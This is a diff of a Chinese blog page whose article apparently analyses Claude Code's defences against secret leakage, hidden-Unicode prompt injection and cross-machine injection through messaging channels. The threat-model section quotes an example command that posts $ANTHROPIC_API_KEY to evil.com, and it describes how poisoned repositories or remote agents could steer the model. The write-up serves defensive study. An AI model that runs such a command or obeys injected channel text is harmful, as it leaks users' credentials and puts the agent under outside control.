@@ -32,7 +32,13 @@
   <link rel="stylesheet" href="/mdui2/mdui-material-font-aliases.css">
 
   <!-- Font Awesome 6 for brand icons -->
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <link
+    rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"
+    integrity="sha384-t1nt8BQoYMLFN5p42tRAtuAAFQaCQODekUVeKKZrEnEyp4H2R0RHFz0KWpmj7i8g"
+    crossorigin="anonymous"
+    referrerpolicy="no-referrer"
+  >
 
   
   <!-- KaTeX CSS -->
@@ -60,8 +66,6 @@
   
   <link rel="stylesheet" href="/css/banner-page.css">
   
-  <link rel="stylesheet" href="/css/sidebar-footer.css">
-  
   <link rel="stylesheet" href="/css/article-prose.css">
   
   <link rel="stylesheet" href="/css/index-taxonomy.css">
@@ -72,17 +76,9 @@
 
   <meta name="theme-color" content="#6750A4">
 
-  <!-- Google tag (gtag.js) -->
-  <script async src="https://www.googletagmanager.com/gtag/js?id=G-LV49J0P7YC"></script>
-  <script>
-    window.dataLayer = window.dataLayer || [];
-    function gtag(){dataLayer.push(arguments);}
-    gtag('js', new Date());
-
-    gtag('config', 'G-LV49J0P7YC');
-  </script>
-
-<meta name="generator" content="Hexo 8.1.1"><link href="https://cdn.bootcss.com/KaTeX/0.11.1/katex.min.css" rel="stylesheet" /></head>
+  
+  
+<meta name="generator" content="Hexo 8.1.1"></head>
 <body id="top">
   
   <!-- Header/AppBar -->
@@ -112,7 +108,7 @@
       <a
         href="/categories/%E7%A2%8E%E7%A2%8E%E5%BF%B5"
         
-      >碎碎念 · 399</a>
+      >碎碎念 · 421</a>
         
       
         
@@ -126,7 +122,7 @@
       <a
         href="/categories/%E4%B8%93%E6%A0%8F"
         
-      >专栏 · 14</a>
+      >专栏 · 7</a>
         
       
     </nav>
@@ -154,57 +150,25 @@
       data-label-follow="Use system theme (Shift+click to restore)"
       aria-label="Switch to dark mode"
     ></mdui-button-icon>
-    <div class="topbar-profile-cluster">
-  <mdui-dropdown
-    class="topbar-profile-dropdown"
-    trigger="hover focus"
-    placement="bottom-end"
-    open-delay="180"
-    close-delay="280"
+    
+<div class="topbar-profile-cluster">
+  <mdui-button-icon
+    variant="standard"
+    class="topbar-profile-trigger-btn"
+    href="/about"
+    aria-label="About"
+    
   >
-    <mdui-button-icon
-      slot="trigger"
-      variant="standard"
-      class="topbar-profile-trigger-btn"
-      href="/about"
-      aria-haspopup="true"
-      aria-label="About · Open author profile and social links"
-      
-    >
-      
-        <img src="/image/avatar.jpeg" class="topbar-profile-trigger__avatar" alt="" width="40" height="40" decoding="async">
-      
-    </mdui-button-icon>
-
-    <mdui-card variant="filled" class="sidebar-card topbar-profile-panel">
-      <div class="sidebar-card-media">
-        <img src="/image/card.png" class="sidebar-card-media__img" alt="">
-      </div>
-
-      <div class="sidebar-card-content--main sidebar-card-body">
-        
-          <img src="/image/avatar.jpeg" class="sidebar-avatar-offset sidebar-avatar" alt="AAA爆炒生猛活海鲜">
-        
-
-        <div class="sidebar-author">AAA爆炒生猛活海鲜</div>
-        <div class="sidebar-bio">
-          吃点好的
-        </div>
-        <div class="topbar-profile-about-wrap">
-          <mdui-button
-            variant="text"
-            href="/about"
-            class="topbar-profile-about"
-            
-          >About</mdui-button>
-        </div>
-      </div>
-    </mdui-card>
-  </mdui-dropdown>
+    
+      <img src="/image/avatar.jpeg" class="topbar-profile-trigger__avatar" alt="" width="40" height="40" decoding="async">
+    
+  </mdui-button-icon>
 
   
     <nav class="topbar-profile-social-bar" aria-label="Social links">
       
+        
+        
         <mdui-button-icon
           class="topbar-profile-social-bar__btn"
           variant="standard"
@@ -216,7 +180,10 @@
         >
           <i class="fa-brands fa-qq mdui-text-color-light-blue topbar-profile-social-bar__icon" aria-hidden="true"></i>
         </mdui-button-icon>
+        
       
+        
+        
         <mdui-button-icon
           class="topbar-profile-social-bar__btn"
           variant="standard"
@@ -228,7 +195,10 @@
         >
           <i class="fa-brands fa-github mdui-text-color-black topbar-profile-social-bar__icon" aria-hidden="true"></i>
         </mdui-button-icon>
+        
       
+        
+        
         <mdui-button-icon
           class="topbar-profile-social-bar__btn"
           variant="standard"
@@ -240,7 +210,10 @@
         >
           <i class="fa-brands fa-bilibili mdui-text-color-pink topbar-profile-social-bar__icon" aria-hidden="true"></i>
         </mdui-button-icon>
+        
       
+        
+        
         <mdui-button-icon
           class="topbar-profile-social-bar__btn"
           variant="standard"
@@ -252,6 +225,7 @@
         >
           <i class="fa-solid fa-envelope mdui-text-color-blue topbar-profile-social-bar__icon" aria-hidden="true"></i>
         </mdui-button-icon>
+        
       
     </nav>
   
@@ -301,7 +275,7 @@
   data-banner-layout-root
   data-banner-layout-config="/js/banner-title-layout.json"
 >
-  <div class="banner-bg" style="--banner-bg-image: url(/image/banner.jpeg);"></div>
+  <div class="banner-bg" style='--banner-bg-image: url("/image/banner.jpeg");'></div>
 
   <div class="banner-overlay banner-overlay--tint">
     <div class="banner-inner">
@@ -409,6 +383,8 @@
 <script src="/js/banner-title-layout.js" defer></script>
 
 
+
+
 <div class="page-shell app-container">
     <div class="page-grid page-grid--post">
         <!-- 文章内容 -->
@@ -434,9 +410,9 @@
                     <div class="mdui-prose">
                         <p>在前文的分析中，我们详细拆解了位于输出层的 Auto Mode 分类器。然而，分类器的视角是受限的——它只能看到“文本 transcript”。</p>
 <p>如果恶意指令伪装成不可见字符欺骗了解析器？如果合法的 Bash 脚本在执行时读取了系统环境变量里的 API Key 并发送到外部服务器？为了封堵这些分类器“看不见”的侧信道与边缘攻击面，Claude Code 在<strong>输入解析层、子进程执行层以及跨机器通道层</strong>，部署了一系列正交互补的防御机制。</p>
-<p>以下机制与 <strong>transcript 分类器</strong>、<strong>Tier 1/2 快路径</strong> 正交，主要覆盖 <strong>子进程环境</strong>、<strong>用户/外部输入面</strong> 与 <strong>通道</strong>。<strong>上下文如何被整形</strong>（budget / snip / microcompact / autocompact）见 <a href="/ccauto-A-单次请求的上下文整形流水线/" title="">附录 A</a> 与 <a href="/ccauto-B-长会话压缩与多线程状态隔离/" title="">附录 B</a>。</p>
+<p>以下机制与 <strong>transcript 分类器</strong>、<strong>Tier 1/2 快路径</strong> 正交，主要覆盖 <strong>子进程环境</strong>、<strong>用户/外部输入面</strong> 与 <strong>通道</strong>。<strong>上下文如何被整形</strong>（budget / snip / microcompact / autocompact）见 <a href="/ccauto-A-%E5%8D%95%E6%AC%A1%E8%AF%B7%E6%B1%82%E7%9A%84%E4%B8%8A%E4%B8%8B%E6%96%87%E6%95%B4%E5%BD%A2%E6%B5%81%E6%B0%B4%E7%BA%BF/" title="">附录 A</a> 与 <a href="/ccauto-B-%E9%95%BF%E4%BC%9A%E8%AF%9D%E5%8E%8B%E7%BC%A9%E4%B8%8E%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%8A%B6%E6%80%81%E9%9A%94%E7%A6%BB/" title="">附录 B</a>。</p>
 <hr>
-<h2 id="1-执行层：子进程环境变量剥离-subprocessenv">1. 执行层：子进程环境变量剥离 (<code>subprocessEnv</code>)</h2>
+<h2 id="1-执行层：子进程环境变量剥离-subprocessEnv">1. 执行层：子进程环境变量剥离 (<code>subprocessEnv</code>)</h2>
 <p>当大模型决定执行一个 <code>Bash</code> 命令或调用本地 MCP 服务时，系统必须创建一个子进程（Subprocess）。这里潜伏着一个巨大的外泄风险。</p>
 <h3 id="威胁模型">威胁模型</h3>
 <p>如果子进程完整继承了父进程（Claude Code 自身）的环境变量，那么 <code>$ANTHROPIC_API_KEY</code> 等核心密钥就会暴露给子进程。如果恶意工作流或被污染的开源仓库诱导模型生成类似 <code>curl -X POST -d &quot;key=$ANTHROPIC_API_KEY&quot; evil.com</code> 的命令，密钥就会被轻易窃取。</p>
@@ -464,9 +440,9 @@
 <hr>
 <h2 id="2-解析层：输入净化与幽灵字符防御">2. 解析层：输入净化与幽灵字符防御</h2>
 <p>攻击往往在会话还未真正开始前就已经发生。当用户通过 DeepLink 拉起 Claude Code，或者粘贴了一段包含恶意指令的 Issue 文本时，攻击载荷可能已经潜入。</p>
-<h3 id="威胁模型">威胁模型</h3>
+<h3 id="威胁模型-2">威胁模型</h3>
 <p>攻击者利用不可见 Unicode（Invisible Unicode）或 ASCII Smuggling（ASCII 走私）技术，将恶意指令隐藏在看似正常的 URL 或文本中。模型或人类用户在视觉上觉得内容无害，但底层字节流却改变了指令的边界。</p>
-<h3 id="防御机制">防御机制</h3>
+<h3 id="防御机制-2">防御机制</h3>
 <ul>
 <li><strong><code>sanitization</code> 模块</strong>（<code>src/utils/sanitization.ts</code>）：模块头约 L1–23 说明针对不可见 Unicode、ASCII smuggling、hidden prompt injection 等策略；<strong><code>partiallySanitizeUnicode</code></strong> 实现约 L25。</li>
 <li><strong>DeepLink</strong>：<code>parseDeepLink.ts</code> 对 query 调用 <code>partiallySanitizeUnicode</code>（约 L138–141），注释标明剥离 hidden Unicode / ASCII smuggling。</li>
@@ -474,11 +450,11 @@
 </ul>
 <p><strong>威胁模型（整理用）</strong>：deeplink、粘贴或 issue 中的 <strong>不可见 Unicode / 双向控制符</strong> 可篡改<strong>可见边界</strong>；净化在<strong>进入主会话逻辑之前</strong>削减载体。</p>
 <hr>
-<h2 id="3-通道层：跨机器的信任边界-sendmessage">3. 通道层：跨机器的信任边界 (<code>SendMessage</code>)</h2>
+<h2 id="3-通道层：跨机器的信任边界-SendMessage">3. 通道层：跨机器的信任边界 (<code>SendMessage</code>)</h2>
 <p>当引入多智能体协作或跨机器通信时（例如 <code>SendMessageTool</code> 或 Channels），信任边界被打破了。<strong>通道即注入面</strong>：与 <a href="/ccauto-04-multi-agent/" title="">04 — 多 Agent 安全交接</a> 中的交接叙事并列。</p>
-<h3 id="威胁模型">威胁模型</h3>
+<h3 id="威胁模型-3">威胁模型</h3>
 <p>远端机器（或另一个会话）生成的字节流，在本地会话看来等同于“用户输入”。如果攻击者控制了远端节点，就可以通过通信通道向本地高权限 Agent 注入恶意 Prompt（Cross-machine Prompt Injection）。</p>
-<h3 id="防御机制">防御机制</h3>
+<h3 id="防御机制-3">防御机制</h3>
 <p>针对这类跨越信任边界的通道工具，系统会强制挂载 <code>safetyCheck</code> 拦截器。以跨机桥接地址为例，<code>SendMessage</code> 的 <code>checkPermissions</code> 在命中 <code>UDS_INBOX</code> 且目标为 <code>bridge</code> 方案时返回 <code>behavior: 'ask'</code>，并在 <code>decisionReason</code> 中标注 <code>type: 'safetyCheck'</code> 与 <code>classifierApprovable: false</code>（<code>src/tools/SendMessageTool/SendMessageTool.ts</code> 约 L585–599；工具内注释指明由 <code>permissions.ts</code> 在 bypass 与 auto 分支之前处理）。在 <strong>auto mode</strong> 下，非 <code>classifierApprovable</code> 的 <code>safetyCheck</code> 会短路 acceptEdits、白名单与分类器（<code>src/utils/permissions/permissions.ts</code> 约 L526–548）；在 <strong><code>bypassPermissions</code></strong> 下，<code>safetyCheck</code> 仍保持 <code>ask</code> 并先于 <code>2a</code> 放行逻辑（同文件约 L1252–1259），因此不会与「危险跳过权限」混为一谈。</p>
 <p>实验性 Channel 入站 UI 在 <strong><code>src/components/LogoV2/ChannelsNotice.tsx</code></strong>（约 L138 一带）对用户提示 <strong>prompt injection risks</strong>，与代码层 <code>safetyCheck</code> 同属「通道治理」。</p>
 <p><strong>威胁模型（整理用）</strong>：<strong>跨机器或跨会话</strong> 时，远端字节流与本地用户输入 <strong>等价进入 transcript</strong>；若可绕过 <code>bypassPermissions</code>，等同把 <strong>外部未过滤内容</strong> 接入高权限路径。</p>
@@ -558,7 +534,7 @@
     Note over G,M: 拦截动作短路了整个下游。<br/>恶意请求根本不会触碰 Spawn，也不会产生物理外泄风险。
   end</pre>
 <p><strong>图注</strong>：分类器细节见 <a href="/ccauto-02-classifier/" title="">02</a>；AFK / PI 见 <a href="/ccauto-04-multi-agent/" title="">04</a>。<strong>deny</strong> 路径不进入 spawn，故 <strong>不经</strong> <code>subprocessEnv</code>。无 AFK latch 时 PI 的 <code>opt</code> 分支不生效，勿画成客户端硬错误。</p>
-<h2 id="特性与环境变量速查-全集">特性与环境变量速查（全集）</h2>
+<h2 id="特性与环境变量速查（全集）">特性与环境变量速查（全集）</h2>
 <table>
 <thead>
 <tr>
@@ -571,7 +547,7 @@
 <tr>
 <td><code>HISTORY_SNIP</code></td>
 <td><code>query.ts</code> 是否执行 <code>snipCompactIfNeeded</code></td>
-<td><a href="/ccauto-A-单次请求的上下文整形流水线/" title="">附录 A</a></td>
+<td><a href="/ccauto-A-%E5%8D%95%E6%AC%A1%E8%AF%B7%E6%B1%82%E7%9A%84%E4%B8%8A%E4%B8%8B%E6%96%87%E6%95%B4%E5%BD%A2%E6%B5%81%E6%B0%B4%E7%BA%BF/" title="">附录 A</a></td>
 </tr>
 <tr>
 <td><code>CONTEXT_COLLAPSE</code></td>
@@ -633,6 +609,26 @@
 <p>从微观的 Token 预算替换，到宏观的多 Agent 缓存隔离，再到覆盖整个时间轴的纵深安全网络：成熟 Agent 工具的壁垒往往不在「调用大模型 API」本身，而在<strong>基础设施如何在效率、质量与安全之间做叠层与取舍</strong>。</p>
 
                     </div>
+                    
+                    <section class="post-backlinks" aria-labelledby="post-backlinks-title">
+                        <h2 id="post-backlinks-title" class="post-backlinks__title">Referenced by</h2>
+                        <div class="post-backlinks__list">
+                            
+                                <a class="post-backlinks__link" href="/Blog%20Category/%E7%AC%94%E8%AE%B0%20-%20%E7%9B%AE%E5%BD%95/">笔记 - 目录</a>
+                            
+                                <a class="post-backlinks__link" href="/Tag/LLM%E7%9B%B8%E5%85%B3/">LLM相关</a>
+                            
+                                <a class="post-backlinks__link" href="/Tag/%E8%BD%AF%E4%BB%B6%E7%9B%B8%E5%85%B3/">软件相关</a>
+                            
+                                <a class="post-backlinks__link" href="/ccauto-00-index/">CC Auto Mode - Auto Mode 安全架构分析报告系列</a>
+                            
+                                <a class="post-backlinks__link" href="/ccauto-A-%E5%8D%95%E6%AC%A1%E8%AF%B7%E6%B1%82%E7%9A%84%E4%B8%8A%E4%B8%8B%E6%96%87%E6%95%B4%E5%BD%A2%E6%B5%81%E6%B0%B4%E7%BA%BF/">CC Auto Mode 附录 A - 单次请求的上下文整形流水线</a>
+                            
+                                <a class="post-backlinks__link" href="/ccauto-B-%E9%95%BF%E4%BC%9A%E8%AF%9D%E5%8E%8B%E7%BC%A9%E4%B8%8E%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%8A%B6%E6%80%81%E9%9A%94%E7%A6%BB/">CC Auto Mode 附录 B - 长会话压缩与多线程状态隔离</a>
+                            
+                        </div>
+                    </section>
+                    
                 </div>
                 
 
@@ -669,7 +665,7 @@
                 <div class="post-toc-inner">
                     <div class="post-toc__title">Table of Contents</div>
                     <div class="post-toc-scroll mdui-prose">
-                        <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#1-%E6%89%A7%E8%A1%8C%E5%B1%82%EF%BC%9A%E5%AD%90%E8%BF%9B%E7%A8%8B%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%89%A5%E7%A6%BB-subprocessenv"><span class="post-toc-text">1. 执行层：子进程环境变量剥离 (subprocessEnv)</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%A8%81%E8%83%81%E6%A8%A1%E5%9E%8B"><span class="post-toc-text">威胁模型</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E9%98%B2%E5%BE%A1%E6%9C%BA%E5%88%B6"><span class="post-toc-text">防御机制</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#2-%E8%A7%A3%E6%9E%90%E5%B1%82%EF%BC%9A%E8%BE%93%E5%85%A5%E5%87%80%E5%8C%96%E4%B8%8E%E5%B9%BD%E7%81%B5%E5%AD%97%E7%AC%A6%E9%98%B2%E5%BE%A1"><span class="post-toc-text">2. 解析层：输入净化与幽灵字符防御</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%A8%81%E8%83%81%E6%A8%A1%E5%9E%8B"><span class="post-toc-text">威胁模型</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E9%98%B2%E5%BE%A1%E6%9C%BA%E5%88%B6"><span class="post-toc-text">防御机制</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#3-%E9%80%9A%E9%81%93%E5%B1%82%EF%BC%9A%E8%B7%A8%E6%9C%BA%E5%99%A8%E7%9A%84%E4%BF%A1%E4%BB%BB%E8%BE%B9%E7%95%8C-sendmessage"><span class="post-toc-text">3. 通道层：跨机器的信任边界 (SendMessage)</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%A8%81%E8%83%81%E6%A8%A1%E5%9E%8B"><span class="post-toc-text">威胁模型</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E9%98%B2%E5%BE%A1%E6%9C%BA%E5%88%B6"><span class="post-toc-text">防御机制</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#4-%E8%BD%AF%E7%A1%AC%E7%BB%93%E5%90%88%EF%BC%9A%E7%B3%BB%E7%BB%9F%E6%8F%90%E7%A4%BA%E8%AF%8D%E4%B8%AD%E7%9A%84%E6%B3%A8%E5%85%A5%E8%AD%A6%E8%A7%89"><span class="post-toc-text">4. 软硬结合：系统提示词中的注入警觉</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#5-%E7%BB%88%E6%9E%81%E5%85%A8%E6%99%AF%E5%9B%BE%EF%BC%9A%E5%AE%89%E5%85%A8%E6%A0%88%E7%9A%84%E6%97%B6%E9%97%B4%E8%BD%B4%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F"><span class="post-toc-text">5. 终极全景图：安全栈的时间轴生命周期</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%8D%95%E8%BD%AE%E6%94%BB%E9%98%B2%E6%8E%A8%E6%BC%94"><span class="post-toc-text">单轮攻防推演</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E7%89%B9%E6%80%A7%E4%B8%8E%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%80%9F%E6%9F%A5-%E5%85%A8%E9%9B%86"><span class="post-toc-text">特性与环境变量速查（全集）</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E6%95%B4%E7%90%86%E7%94%A8%E6%A3%80%E6%9F%A5%E6%B8%85%E5%8D%95"><span class="post-toc-text">整理用检查清单</span></a></li></ol>
+                        <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#1-%E6%89%A7%E8%A1%8C%E5%B1%82%EF%BC%9A%E5%AD%90%E8%BF%9B%E7%A8%8B%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%89%A5%E7%A6%BB-subprocessEnv"><span class="post-toc-text">1. 执行层：子进程环境变量剥离 (subprocessEnv)</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%A8%81%E8%83%81%E6%A8%A1%E5%9E%8B"><span class="post-toc-text">威胁模型</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E9%98%B2%E5%BE%A1%E6%9C%BA%E5%88%B6"><span class="post-toc-text">防御机制</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#2-%E8%A7%A3%E6%9E%90%E5%B1%82%EF%BC%9A%E8%BE%93%E5%85%A5%E5%87%80%E5%8C%96%E4%B8%8E%E5%B9%BD%E7%81%B5%E5%AD%97%E7%AC%A6%E9%98%B2%E5%BE%A1"><span class="post-toc-text">2. 解析层：输入净化与幽灵字符防御</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%A8%81%E8%83%81%E6%A8%A1%E5%9E%8B-2"><span class="post-toc-text">威胁模型</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E9%98%B2%E5%BE%A1%E6%9C%BA%E5%88%B6-2"><span class="post-toc-text">防御机制</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#3-%E9%80%9A%E9%81%93%E5%B1%82%EF%BC%9A%E8%B7%A8%E6%9C%BA%E5%99%A8%E7%9A%84%E4%BF%A1%E4%BB%BB%E8%BE%B9%E7%95%8C-SendMessage"><span class="post-toc-text">3. 通道层：跨机器的信任边界 (SendMessage)</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%A8%81%E8%83%81%E6%A8%A1%E5%9E%8B-3"><span class="post-toc-text">威胁模型</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E9%98%B2%E5%BE%A1%E6%9C%BA%E5%88%B6-3"><span class="post-toc-text">防御机制</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#4-%E8%BD%AF%E7%A1%AC%E7%BB%93%E5%90%88%EF%BC%9A%E7%B3%BB%E7%BB%9F%E6%8F%90%E7%A4%BA%E8%AF%8D%E4%B8%AD%E7%9A%84%E6%B3%A8%E5%85%A5%E8%AD%A6%E8%A7%89"><span class="post-toc-text">4. 软硬结合：系统提示词中的注入警觉</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#5-%E7%BB%88%E6%9E%81%E5%85%A8%E6%99%AF%E5%9B%BE%EF%BC%9A%E5%AE%89%E5%85%A8%E6%A0%88%E7%9A%84%E6%97%B6%E9%97%B4%E8%BD%B4%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F"><span class="post-toc-text">5. 终极全景图：安全栈的时间轴生命周期</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%8D%95%E8%BD%AE%E6%94%BB%E9%98%B2%E6%8E%A8%E6%BC%94"><span class="post-toc-text">单轮攻防推演</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E7%89%B9%E6%80%A7%E4%B8%8E%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%80%9F%E6%9F%A5%EF%BC%88%E5%85%A8%E9%9B%86%EF%BC%89"><span class="post-toc-text">特性与环境变量速查（全集）</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E6%95%B4%E7%90%86%E7%94%A8%E6%A3%80%E6%9F%A5%E6%B8%85%E5%8D%95"><span class="post-toc-text">整理用检查清单</span></a></li></ol>
                     </div>
                 </div>
             </mdui-card>
@@ -698,6 +694,11 @@
     <nav class="site-footer__social" aria-label="Social links">
       
         
+        
+        
+        
+        
+        
       <mdui-button-icon
         class="site-footer__social-btn"
         variant="standard"
@@ -709,7 +710,13 @@
       >
         <i class="fa-brands fa-qq mdui-text-color-light-blue site-footer__social-icon" aria-hidden="true"></i>
       </mdui-button-icon>
+        
       
+        
+        
+        
+        
+        
         
       <mdui-button-icon
         class="site-footer__social-btn"
@@ -722,7 +729,13 @@
       >
         <i class="fa-brands fa-github mdui-text-color-black site-footer__social-icon" aria-hidden="true"></i>
       </mdui-button-icon>
+        
       
+        
+        
+        
+        
+        
         
       <mdui-button-icon
         class="site-footer__social-btn"
@@ -735,7 +748,13 @@
       >
         <i class="fa-brands fa-bilibili mdui-text-color-pink site-footer__social-icon" aria-hidden="true"></i>
       </mdui-button-icon>
+        
       
+        
+        
+        
+        
+        
         
       <mdui-button-icon
         class="site-footer__social-btn"
@@ -748,6 +767,7 @@
       >
         <i class="fa-solid fa-envelope mdui-text-color-blue site-footer__social-icon" aria-hidden="true"></i>
       </mdui-button-icon>
+        
       
     </nav>
     </div>
